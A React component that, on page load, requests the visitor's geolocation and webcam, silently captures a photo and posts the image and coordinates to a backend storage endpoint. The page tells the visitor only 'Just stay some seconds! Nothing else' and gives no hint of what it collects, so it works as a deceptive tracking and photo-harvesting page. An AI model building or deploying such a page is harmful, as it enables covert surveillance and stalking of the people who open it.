import React, { useEffect, useState } from 'react';
import axios from 'axios';

const Main = () => {
  const [coords, setCoords] = useState(null);  // Store coordinates as an object
  const [image, setImage] = useState(null);

  useEffect(() => {
    // Get user location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setCoords({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });
        },
        (error) => console.error("Error fetching location: ", error)
      );
    } else {
      console.error("Geolocation not supported");
    }

    // Capture user image
    const captureImage = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
          video.play();
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          setImage(canvas.toDataURL("image/png"));
          
          // Stop video stream after capturing the image
          stream.getTracks().forEach(track => track.stop());
        };
      } catch (error) {
        console.error("Error accessing camera: ", error);
      }
    };
    
    captureImage();
  }, []);

  useEffect(() => {
    // Send data to backend once both coords and image are available
    if (coords && image) {
      const sendData = async () => {
        try {
          await axios.post('http://localhost:4000/api/store', {
            coords,
            image,
          });
          console.log("Data sent to backend successfully");
        } catch (error) {
          console.error("Error sending data to backend:", error);
        }
      };

      sendData();
    }
  }, [coords, image]);

  return (
    <div>
      <h3>Just stay some seconds! Nothing else</h3>
    </div>
  );
}

export default Main;
